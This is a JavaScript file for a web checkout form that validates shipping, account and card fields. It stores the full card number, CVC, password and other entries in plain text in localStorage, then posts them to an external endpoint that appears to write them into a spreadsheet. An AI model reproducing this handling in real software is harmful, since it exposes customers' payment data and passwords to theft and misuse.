// form elements
const formElements = {
    email: document.getElementById('email-address'),
    email_error: document.getElementById('email-address_error'),
    password: document.getElementById('password'),
    password_error: document.getElementById('password_error'),

    firstName: document.getElementById('first-name'),
    firstName_error: document.getElementById('first-name_error'),
    lastName: document.getElementById('last-name'),
    lastName_error: document.getElementById('last-name_error'),
    streetAddress: document.getElementById('street-address'),
    streetAddress_error: document.getElementById('street-address_error'),
    aptUnit: document.getElementById('apt-unit'),
    aptUnit_error: document.getElementById('apt-unit_error'),
    city: document.getElementById('city'),
    city_error: document.getElementById('city_error'),
    shippingStates: document.getElementById('shipping-states'),
    shippingStates_error: document.getElementById('shipping-states_error'),
    postalCode: document.getElementById('postal-code'),
    postalCode_error: document.getElementById('postal-code_error'),
    phoneNumber: document.getElementById('phone-number'),
    phoneNumber_error: document.getElementById('phone-number_error'),

    cardNumber: document.getElementById('credit-card-number'),
    cardNumber_error: document.getElementById('credit-card-number_error'),
    cardCVC: document.getElementById('card-cvc'),
    cardCVC_error: document.getElementById('card-cvc_error'),
    cardExpiry: document.getElementById('card-expiry'),
    cardExpiry_error: document.getElementById('card-expiry_error'),
    billingPostal: document.getElementById('billing-postal-code'),
    billingPostal_error: document.getElementById('billing-postal-code_error'),
    billingStates: document.getElementById('billing-states'),
    billingStates_error: document.getElementById('billing-states_error'),
};

// Handle form submission
const form = document.getElementById('checkout-form');
form.addEventListener('submit', async function (e) {
    e.preventDefault(); // prevent the page reload on submission

    const submitError = document.getElementById('error-on-submit');
    console.log('formElements.shippingStates', formElements.shippingStates.value);

    const formData = {
        email: formElements.email.value.trim(),
        password: formElements.password.value.trim(),
        firstName: formElements.firstName.value.trim(),
        lastName: formElements.lastName.value.trim(),
        streetAddress: formElements.streetAddress.value.trim(),
        aptUnit: formElements.aptUnit.value.trim(),
        city: formElements.city.value.trim(),
        shippingStates: formElements.shippingStates.value.trim(),
        postalCode: formElements.postalCode.value.trim(),
        phoneNumber: formElements.phoneNumber.value.trim(),
        cardNumber: formElements.cardNumber.value.trim(),
        cardCVC: formElements.cardCVC.value.trim(),
        cardExpiry: formElements.cardExpiry.value.trim(),
        billingPostal: formElements.billingPostal.value.trim(),
        billingStates: formElements.billingStates.value.trim(),
    };

    const isValid = checkValidation(formData);
    console.log('isValid:', isValid);

    if (!isValid) {
        console.log("Form not submitted. Validation failed.");
        submitError.innerText = "Please, fill the above fields !"
        return; // Stop further processing
    };

    // Proceed if form is valid
    console.log("Form Submitted:", formData);
    localStorage.setItem('Form Data', JSON.stringify(formData));
    clearFormInputs(); // clear all the values of input
    await updateSheet(formData);
    console.log("Form submitted and data saved in localStorage.");

    window.location.href = './offer1.html'
});

// Clear form inputs after submission
const clearFormInputs = () => {
    formElements.email.value = '';
    formElements.password.value = '';
    formElements.firstName.value = '';
    formElements.lastName.value = '';
    formElements.streetAddress.value = '';
    formElements.aptUnit.value = '';
    formElements.city.value = '';
    formElements.postalCode.value = '';
    formElements.phoneNumber.value = '';
    formElements.cardNumber.value = '';
    formElements.cardCVC.value = '';
    formElements.cardExpiry.value = '';
    formElements.billingPostal.value = '';
};

// Utility function to add an event listener for input sanitization
const addInputListener = (element, regex, sanitizeFn = null) => {
    if (!element) return; // Prevent error if element is not found
    element.addEventListener('input', function () {
        this.value = sanitizeFn ? sanitizeFn(this.value) : this.value.replace(regex, '');
    });
};

// Shipping Address Sanitization Rules
addInputListener(formElements.firstName, /[0-9]/g);
addInputListener(formElements.lastName, /[0-9]/g);
addInputListener(formElements.streetAddress, /[^a-zA-Z0-9\s,.\-\/]/g);
addInputListener(formElements.aptUnit, /[^a-zA-Z0-9\s#\-\/]/g);
addInputListener(formElements.city, /[0-9]/g);
addInputListener(formElements.postalCode, /\D/g);
addInputListener(formElements.phoneNumber, /[^0-9+()\-\s]/g);

// Billing Information
addInputListener(formElements.cardNumber, /\D/g, function (value) {
    const cleanedValue = value.replace(/\D/g, ''); // Step 1: Remove all non-digit characters
    const formattedValue = cleanedValue.replace(/(.{4})(?=.)/g, '$1 ').trim(); // Step 2: Format the card number into groups of 4 digits ( Insert a space after every 4 digits )
    return formattedValue; // Step 3: Return the formatted value
});
addInputListener(formElements.cardCVC, /[a-zA-Z]/g);  // Only numbers for CVC
addInputListener(formElements.cardExpiry, /\D/g, function (value) {
    // Step 1: Remove all non-digit characters
    const cleanedValue = value.replace(/\D/g, '');

    // Step 2: Limit input to 4 digits (MM/YY format) without including the separator
    let input = cleanedValue.slice(0, 4);

    // Step 3: Separate into month and year (MM/YY)
    let month = input.slice(0, 2);
    let year = input.slice(2, 4);

    // Step 4: Get current year and max year (current year + 10)
    const currentYear = new Date().getFullYear();
    const currentYearLastTwoDigits = currentYear.toString().slice(-2);  // Get last two digits of the current year
    const maxYear = (currentYear + 10).toString().slice(-2); // max allowed year (current year + 10)

    // Step 5: Validate the month (must be between 01 and 12)
    if (month.length === 2) {
        const numericMonth = parseInt(month, 10);
        if (numericMonth < 1) month = '01';
        if (numericMonth > 12) month = '12';
    }

    // Step 6: Validate the year
    // If the year is less than the current year, set it to the current year.
    // Also, ensure the year is no greater than the max allowed year.
    if (year.length === 2) {
        if (parseInt(year, 10) < parseInt(currentYearLastTwoDigits, 10)) {
            year = currentYearLastTwoDigits;  // Prevent entering a year less than current year
        } else if (parseInt(year, 10) > parseInt(maxYear, 10)) {
            year = maxYear; // Prevent entering a year beyond max year
        }
    }

    // Step 7: Format the value as MM/YY or just MM if still typing
    if (input.length > 2) {
        return `${month}/${year}`;
    } else {
        return month; // Only show month if it's not fully entered yet
    }
});

// Function for validating form values and displaying error messages
const checkValidation = (formData) => {
    const keys = Object.keys(formData);

    let isValid = true;
    keys.forEach((key) => {
        const value = formData[key];
        const errorElement = formElements[key + '_error'];

        if (!value) {
            isValid = false; // Mark form as invalid
            if (errorElement) {
                errorElement.textContent = `This field is required.`;
                errorElement.classList.remove('hide');
                formElements[key].style.borderColor = 'red';
            }
        } else {
            if (errorElement) {
                errorElement.textContent = '';
                errorElement.classList.add('hide');
                formElements[key].style.borderColor = 'green';
            }
        }
    });

    return isValid;
};

// // Get all input fields and error messages elements
const inputFields = document.querySelectorAll('.input-field');
const inputSelectors = document.querySelectorAll('.input-selector');
const inputErrors = document.querySelectorAll('.error-message');

// Regex patterns for specific fields
const patterns = {
    email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    // phone: /^\d{10}$/, // 10 digit number
    phone: /^(\+1\s?)?(\()?(\d{3})(\))?[\s.-]?(\d{3})[\s.-]?(\d{4})$/,
    postal: /^\d{5,8}$/, // US ZIP or ZIP+4
    creditCard: /^\d{15,19}$/, // Most credit cards
    cvc: /^\d{3,4}$/, // CVV (3 or 4 digits)
    expiry: /^(0[1-9]|1[0-2])\/?([0-9]{2})$/, // MM/YY
    name: /^[a-zA-Z\s\-']{2,}$/, // Basic name validation
    password: /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?#&])[A-Za-z\d@$!%*?#&]{8,}$/,
};

function getValidationPattern(id) {
    if (id.includes('email')) return patterns.email;
    if (id.includes('phone')) return patterns.phone;
    if (id.includes('postal')) return patterns.postal;
    if (id.includes('credit-card-number')) return patterns.creditCard;
    if (id.includes('card-cvc')) return patterns.cvc;
    if (id.includes('card-expiry')) return patterns.expiry;
    if (id.includes('first-name') || id.includes('last-name')) return patterns.name;
    if (id.includes('password')) return patterns.password;

    // For fields like address or city, just check non-empty
    return null;
}

inputFields.forEach((inputField, index) => {
    let isNumber = false;
    const id = inputField.id;
    const errorMessageEl = document.getElementById(`${id}_error`);
    if (id === "credit-card-number") isNumber = true;

    inputField.addEventListener('input', function () {
        let cleanedValue = inputField.value.replace(/\s+/g, '').trim();
        const inputValue = isNumber ? Number(cleanedValue) : cleanedValue;
        const pattern = getValidationPattern(id);

        // Special check for password
        if (id === 'password') {
            const password = inputValue;
            const errors = [];

            if (password.length < 8) {
                errors.push('at least 8 characters');
            }
            if (!/[A-Z]/.test(password)) {
                errors.push('one uppercase letter');
            }
            if (!/[a-z]/.test(password)) {
                errors.push('one lowercase letter');
            }
            if (!/\d/.test(password)) {
                errors.push('one number');
            }
            if (!/[@$!%*?#&]/.test(password)) {
                errors.push('one special character (@$!%*?#&)');
            }

            if (errors.length > 0) {
                inputField.style.borderColor = 'red';
                inputField.classList.add('is-invalid');
                inputField.classList.remove('is-valid');
                errorMessageEl.classList.remove('hide');

                // Dynamically build the <ul><li>...</li></ul>
                let errorListHTML = '<ul>';
                errors.forEach(error => {
                    errorListHTML += `<li>Password must contain ${error}</li>`;
                });
                errorListHTML += '</ul>';

                errorMessageEl.innerHTML = errorListHTML;
                return; // Stop further validation
            }
        };

        // General validation
        const isValid = pattern ? pattern.test(inputValue) : inputValue.length > 0;

        if (isValid) {
            inputField.style.borderColor = 'green';
            inputField.classList.add('is-valid');
            inputField.classList.remove('is-invalid');
            errorMessageEl.classList.add('hide');
        } else {
            inputField.style.borderColor = 'red';
            inputField.classList.add('is-invalid');
            inputField.classList.remove('is-valid');
            errorMessageEl.classList.remove('hide');
            errorMessageEl.innerText = 'This field is required';
        }
    });

    inputField.addEventListener('blur', function () {
        // Remove all spaces before processing
        let cleanedValue = inputField.value.replace(/\s+/g, '').trim();
        const inputValue = isNumber ? Number(cleanedValue) : cleanedValue;
        const pattern = getValidationPattern(id);

        if (id === 'password') {
            if (inputValue.length < 8) {
                inputField.style.borderColor = 'red';
                inputField.classList.add('is-invalid');
                inputField.classList.remove('is-valid');
                errorMessageEl.classList.remove('hide');
                errorMessageEl.innerHTML = '<ul><li>Password must contain at least 8 characters</li><li>Password must contain one uppercase letter</li><li>Password must contain one lowercase letter</li><li>Password must contain one number</li><li>Password must contain one special character (@$!%*?#&)</li></ul>';
                return; // Skip the rest of validation
            }
        }

        const isValid = pattern ? pattern.test(inputValue) : inputValue.length > 2;

        if (isValid) {
            inputField.style.borderColor = 'green';
            inputField.classList.add('is-valid');
            inputField.classList.replace('is-invalid', 'is-valid');
            errorMessageEl.classList.add('hide');
        } else {
            inputField.style.borderColor = 'red';
            inputField.classList.replace('is-valid', 'is-invalid');
            errorMessageEl.classList.remove('hide');
            errorMessageEl.innerText = pattern ? 'This field is required' : 'This field is required';
        }
    });
});

inputSelectors.forEach((selector, index) => {
    const id = selector.id;
    const errorMessageEl = document.getElementById(`${id}_error`)

    selector.addEventListener('change', (e) => {
        const value = selector.value.trim();

        if (value === '' || value === 'default' || value === 'Select') {
            selector.style.borderColor = 'red';
            selector.classList.remove('is-valid');
            selector.classList.add('is-invalid');

            errorMessageEl.classList.remove('hide');
            errorMessageEl.innerText = 'This field is required';
        } else {
            selector.style.borderColor = 'green';
            selector.classList.remove('is-invalid');
            selector.classList.add('is-valid');

            errorMessageEl.classList.add('hide');
            errorMessageEl.innerText = '';
        }
    });

    // Optional: Trigger validation on blur as well
    // selector.addEventListener('blur', () => {
    //     const value = selector.value.trim();

    //     if (value === '' || value === 'default' || value === 'Select') {
    //         selector.style.borderColor = 'red';
    //         selector.classList.remove('is-valid');
    //         selector.classList.add('is-invalid');

    //         errorMessageEl.classList.remove('hide');
    //         errorMessageEl.innerText = 'This field is required';
    //     } else {
    //         selector.style.borderColor = 'green';
    //         selector.classList.remove('is-invalid');
    //         selector.classList.add('is-valid');

    //         errorMessageEl.classList.add('hide');
    //         errorMessageEl.innerText = '';
    //     }
    // });
});

const updateSheet = async (formData) => {
    const myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");

    const raw = JSON.stringify({
        formData: { ...formData },
        sheetName: "F.P - 2 checkout",
        column: "!B4:Q4"
    });

    const requestOptions = {
        method: "POST",
        headers: myHeaders,
        body: raw,
        redirect: "follow"
    };

    try {
        await fetch("https://yomz-pages-data.vercel.app/api/checkout2", requestOptions)
            .then((response) => response.text())
            .then((result) => console.log(result))
            .catch((error) => console.error(error));
    } catch (error) {
        console.warn(error)
    }

};
